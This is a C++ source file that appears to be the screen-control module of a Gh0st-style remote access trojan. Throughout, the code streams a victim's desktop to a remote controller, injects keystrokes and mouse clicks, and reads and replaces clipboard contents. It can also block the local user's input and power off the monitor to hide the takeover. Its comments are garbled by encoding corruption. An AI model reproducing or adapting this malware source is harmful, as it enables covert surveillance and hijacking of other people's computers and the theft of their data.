// ScreenManager.cpp: implementation of the newCScreenManager class.
//
//////////////////////////////////////////////////////////////////////
//#define _WIN32_WINNT	0x0400

#include <stdio.h>
#include "newScreenManager.h"
#include "until.h"
#include <WinUser.h> // BlockInput
#include "dwmapi.h"
#pragma comment(lib, "Dwmapi.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

newCScreenManager::newCScreenManager(CClientSocket *pClient):CManager(pClient)
{
	m_bAlgorithm = ALGORITHM_HOME;  // Ĭ��ʹ�ü��ð칫�㷨
	m_biBitCount = 32;              // 3 = 4λ�Ҷ�, 7 = 8λ�Ҷ�
	m_pScreenSpy = new newCScreenSpy(32, false);
	m_bIsWorking = true;
	m_bIsBlankScreen = false;
	m_bIsBlockInput = false;
	m_bIsCaptureLayer = false;
	m_bIsComposition = GetAeroComposition();
	m_hDeskTopDC = GetDC(NULL);
	
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
	m_hCtrlThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CtrlThread, this, 0, NULL, true);
//	SetThreadPriority(m_hWorkThread, THREAD_PRIORITY_TIME_CRITICAL);
}

newCScreenManager::~newCScreenManager()
{
	InterlockedExchange((LPLONG)&m_bIsBlankScreen, FALSE);
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	WaitForSingleObject(m_hCtrlThread, INFINITE);
	CloseHandle(m_hWorkThread);
	CloseHandle(m_hCtrlThread);
	ReleaseDC(NULL, m_hDeskTopDC);
	//SetAeroComposition(m_bIsComposition);
	BlockInput(FALSE); // �ָ����̺����
	
	if (m_pScreenSpy)
		delete m_pScreenSpy;
	m_pScreenSpy = NULL;
}

void newCScreenManager::ResetScreen(int biBitCount)
{
	InterlockedExchange((LPLONG)&m_bIsWorking, FALSE);
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);
	
	delete m_pScreenSpy;
	m_pScreenSpy = NULL;
	
	if (biBitCount == 3)		// 4λ�Ҷ�
		m_pScreenSpy = new newCScreenSpy(4, true);
	else if (biBitCount == 7)	// 8λ�Ҷ�
		m_pScreenSpy = new newCScreenSpy(8, true);
	else
		m_pScreenSpy = new newCScreenSpy(biBitCount);
	
	m_pScreenSpy->setAlgorithm(m_bAlgorithm);
	m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
	
	m_biBitCount = biBitCount;
	
	InterlockedExchange((LPLONG)&m_bIsWorking, TRUE);
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, this, 0, NULL, true);
}

BOOL newCScreenManager::GetAeroComposition()
{
	
	BOOL bDwmIsCompositionEnabled = FALSE;

	DwmIsCompositionEnabled(&bDwmIsCompositionEnabled);
	return bDwmIsCompositionEnabled;
}

void newCScreenManager::SetAeroComposition(UINT uCompositionAction)
{

	HKEY hKey; char szSubKey[1024]; DWORD dwData = uCompositionAction ? 0 : 1;
	//if (lpszUserSid != NULL)
	//	sprintf(szSubKey, "%s\\%s", lpszUserSid, "Software\\Microsoft\\Windows\\DWM");
	//else
	//	sprintf(szSubKey, "%s", "Software\\Microsoft\\Windows\\DWM");
	//if (RegOpenKeyEx(lpszUserSid?HKEY_USERS:HKEY_CURRENT_USER, szSubKey, 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
	//	return;
	//if (RegSetValueEx(hKey, "SuppressDisableCompositionUI", 0, REG_DWORD, (LPBYTE)&dwData, sizeof(dwData)) != ERROR_SUCCESS)
	//{
	//	RegCloseKey(hKey);
	//	return;
	//}
	//RegCloseKey(hKey);
	DwmEnableComposition(uCompositionAction);
}

void newCScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
 	switch (lpBuffer[0])
 	{
	case COMMAND_NEXT:
		// ֪ͨ�ں�Զ�̿��ƶ˶Ի����Ѵ򿪣�WaitForDialogOpen���Է���
		NotifyDialogIsOpen();
		break;
	case COMMAND_newAERO_DISABLE:
		SetAeroComposition(FALSE);
		break;
	case COMMAND_newAERO_ENABLE:
		SetAeroComposition(TRUE);
		break;
	case COMMAND_newSCREEN_RESET:
		ResetScreen(*(LPBYTE)&lpBuffer[1]);
		break;
	case COMMAND_newALGORITHM_RESET:
		m_bAlgorithm = *(LPBYTE)&lpBuffer[1];
		m_pScreenSpy->setAlgorithm(m_bAlgorithm);
		break;
	case COMMAND_newSCREEN_CTRL_ALT_DEL:
		::SimulateCtrlAltDel();
		break;
	case COMMAND_newSCREEN_CONTROL:
		if (m_bIsBlockInput)
			BlockInput(FALSE);       // Զ����Ȼ���Բ���
		ProcessCommand(lpBuffer + 1, nSize - 1);
		if (m_bIsBlockInput)
			BlockInput(m_bIsBlockInput);
		break;
	case COMMAND_newSCREEN_BLOCK_INPUT: // CtrlThread������
		InterlockedExchange((LPLONG)&m_bIsBlockInput, *(LPBYTE)&lpBuffer[1]);
		BlockInput(m_bIsBlockInput);
		break;
	case COMMAND_newSCREEN_BLANK:
		InterlockedExchange((LPLONG)&m_bIsBlankScreen, *(LPBYTE)&lpBuffer[1]);
		break;
	case COMMAND_newSCREEN_CAPTURE_LAYER:
		InterlockedExchange((LPLONG)&m_bIsCaptureLayer, *(LPBYTE)&lpBuffer[1]);
		m_pScreenSpy->setCaptureLayer(m_bIsCaptureLayer);
		break;
	case COMMAND_newSCREEN_GET_CLIPBOARD:
		SendLocalClipboard();
		break;
	case COMMAND_newSCREEN_SET_CLIPBOARD:
		UpdateLocalClipboard((char *)lpBuffer + 1, nSize - 1);
		break;
	default:
		break;
	}
}

void newCScreenManager::sendBitmapInfo()
{
	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBitmapInfoSize();
	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
	lpBuffer[0] = TOKEN_newBITMAPINFO;
	memcpy(lpBuffer + 1, m_pScreenSpy->getBitmapInfo(), dwBytesLength - 1);
	Send(lpBuffer, dwBytesLength);
	VirtualFree(lpBuffer, 0, MEM_RELEASE);	
}

void newCScreenManager::sendFirstScreen()
{
	LPVOID	lpFirstScreen = NULL;
	DWORD	dwBytes;
	lpFirstScreen = m_pScreenSpy->getFirstScreen(&dwBytes);
	if (dwBytes == 0 || !lpFirstScreen)
		return;
	
	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;
	
	lpBuffer[0] = TOKEN_newFIRSTSCREEN;
	memcpy(lpBuffer + 1, lpFirstScreen, dwBytes);
	
	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

void newCScreenManager::sendNextScreen()
{
	LPVOID	lpNextScreen = NULL;
	DWORD	dwBytes;
	lpNextScreen = m_pScreenSpy->getNextScreen(&dwBytes);
	if (dwBytes == 0 || !lpNextScreen)
		return;
	
	DWORD	dwBytesLength = 1 + dwBytes;
	LPBYTE	lpBuffer = new BYTE[dwBytesLength];
	if (lpBuffer == NULL)
		return;
	
	lpBuffer[0] = TOKEN_newNEXTSCREEN;
	memcpy(lpBuffer + 1, lpNextScreen, dwBytes);
	
	Send(lpBuffer, dwBytesLength);
	delete [] lpBuffer;
}

DWORD WINAPI newCScreenManager::WorkThread(LPVOID lparam)
{
	newCScreenManager *pThis = (newCScreenManager *)lparam;
	
	pThis->sendBitmapInfo();
	// �ȿ��ƶ˶Ի����
	pThis->WaitForDialogOpen();
	// ���͵�һ����ĻͼƬ
	pThis->sendFirstScreen();
	
	try // ���ƶ�ǿ�ƹر�ʱ�����
    {
		while (pThis->m_bIsWorking)
		{
			pThis->sendNextScreen();
		}
	}
	catch(...){};
	
	return 0;
}

// ��������߳���Ҫ��Ϊ�˼��ӷֱ��ʺͱ���һֱ����
DWORD WINAPI newCScreenManager::CtrlThread(LPVOID lparam)
{
	static bool bIsScreenBlanked = false;
	newCScreenManager *pThis = (newCScreenManager *)lparam;
	pThis->WaitForDialogOpen();
	
	while (pThis->IsConnect())
	{
		// �ֱ��ʴ�С�ı���
		if (pThis->IsResolutionChange())
		{
			pThis->ResetScreen(pThis->GetCurrentPixelBits());
		}
		if (pThis->m_bIsBlankScreen)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 1, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
			bIsScreenBlanked = true;
		}
		else if (bIsScreenBlanked)
		{
			SystemParametersInfo(SPI_SETPOWEROFFACTIVE, 0, NULL, 0);
			SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)-1);
			bIsScreenBlanked = false;
		}
		Sleep(200);
	}
	return 0;
}

void newCScreenManager::ProcessCommand(LPBYTE lpBuffer, UINT nSize)
{
	// ���ݰ����Ϸ�
	if (nSize % sizeof(MSG) != 0)
		return;
	
	::SwitchInputDesktop();
	
	// �������
	int	nCount = nSize / sizeof(MSG);
	
	// ����������
	for (int i = 0; i < nCount; i++)
	{
		MSG	*pMsg = (MSG *)(lpBuffer + i * sizeof(MSG));
		
		DWORD dx = 65535.0f / (GetDeviceCaps(m_hDeskTopDC, DESKTOPHORZRES) - 1) * pMsg->pt.x;
		DWORD dy = 65535.0f / (GetDeviceCaps(m_hDeskTopDC, DESKTOPVERTRES) - 1) * pMsg->pt.y;
		
		switch(pMsg->message)
		{
		case WM_MOUSEMOVE:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MOVE, dx, dy, 0, 0);
			break;
		case WM_LBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN, dx, dy, 0, 0);
			break;
		case WM_LBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			break;
		case WM_RBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_RIGHTDOWN, dx, dy, 0, 0);
			break;
		case WM_RBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			break;
		case WM_LBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP, dx, dy, 0, 0);
			break;
		case WM_RBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_RIGHTDOWN|MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_RIGHTDOWN|MOUSEEVENTF_RIGHTUP, dx, dy, 0, 0);
			break;
		case WM_MBUTTONDOWN:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MIDDLEDOWN, dx, dy, 0, 0);
			break;
		case WM_MBUTTONUP:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			break;
		case WM_MBUTTONDBLCLK:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MIDDLEDOWN|MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_MIDDLEDOWN|MOUSEEVENTF_MIDDLEUP, dx, dy, 0, 0);
			break;
		case WM_MOUSEWHEEL:
			mouse_event(MOUSEEVENTF_ABSOLUTE|MOUSEEVENTF_WHEEL, dx, dy, GET_WHEEL_DELTA_WPARAM(pMsg->wParam), 0);
			break;
		case WM_KEYDOWN:
		case WM_SYSKEYDOWN:
			if (pMsg->wParam == VK_LEFT || pMsg->wParam == VK_RIGHT || pMsg->wParam == VK_UP || pMsg->wParam == VK_DOWN)
				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_EXTENDEDKEY, 0);
			else
				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), 0, 0);
			break;
		case WM_KEYUP:
		case WM_SYSKEYUP:
			if (pMsg->wParam == VK_LEFT || pMsg->wParam == VK_RIGHT || pMsg->wParam == VK_UP || pMsg->wParam == VK_DOWN)
				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_EXTENDEDKEY|KEYEVENTF_KEYUP, 0);
			else
				keybd_event(pMsg->wParam, MapVirtualKey(pMsg->wParam, 0), KEYEVENTF_KEYUP, 0);
			break;
		default:
			break;
		}
	}
}

void newCScreenManager::UpdateLocalClipboard(char *buf, int len)
{
	if (!::OpenClipboard(NULL))
		return;
	
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_DDESHARE, len);
	if (hglbCopy != NULL) { 
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR) GlobalLock(hglbCopy); 
		memcpy(lptstrCopy, buf, len); 
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
}

void newCScreenManager::SendLocalClipboard()
{
	if (!::OpenClipboard(NULL))
		return;
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	nPacketLen = GlobalSize(hglb) + 1;
	LPSTR lpstr = (LPSTR) GlobalLock(hglb);  
	LPBYTE	lpData = new BYTE[nPacketLen];
	lpData[0] = TOKEN_newCLIPBOARD_TEXT;
	memcpy(lpData + 1, lpstr, nPacketLen - 1);
	::GlobalUnlock(hglb); 
	::CloseClipboard();
	Send(lpData, nPacketLen);
	delete[] lpData;
}

// ��Ļ�ֱ����Ƿ����ı�
bool newCScreenManager::IsResolutionChange()
{
	if (!m_bIsWorking || m_pScreenSpy == NULL)
		return false;
	
	LPBITMAPINFO lpbmi = m_pScreenSpy->getBitmapInfo();
	bool bIsHorizontalChange = lpbmi->bmiHeader.biWidth != GetDeviceCaps(m_hDeskTopDC, DESKTOPHORZRES);
	bool bIsVerticalChange = lpbmi->bmiHeader.biHeight != GetDeviceCaps(m_hDeskTopDC, DESKTOPVERTRES);
	
	return (bIsHorizontalChange || bIsVerticalChange);
}

int newCScreenManager::GetCurrentPixelBits()
{
	return m_biBitCount;
}

BOOL newCScreenManager::IsConnect()
{
	return m_pClient->IsRunning();
}